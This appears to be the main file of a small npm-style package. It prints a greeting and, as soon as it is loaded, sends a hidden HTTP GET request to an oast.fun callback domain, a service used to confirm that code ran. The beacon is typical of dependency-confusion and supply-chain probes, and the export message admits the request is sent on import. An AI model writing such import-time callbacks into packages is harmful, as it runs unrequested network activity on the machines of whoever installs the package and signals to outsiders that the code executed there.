console.log("hello world, this is my package");

const http = require('http');

// Trigger a GET request when this file is loaded
http.get('http://d2101noq72ihajqu0o7ghpp9ds7uwa5s1.oast.fun', res => {
  console.log(`📡 Pinged endpoint: ${res.statusCode}`);
}).on('error', err => {
  console.error('🚨 Request failed:', err.message);
});

// Optional: export something to satisfy require()
module.exports = { message: 'Request sent on import.' };
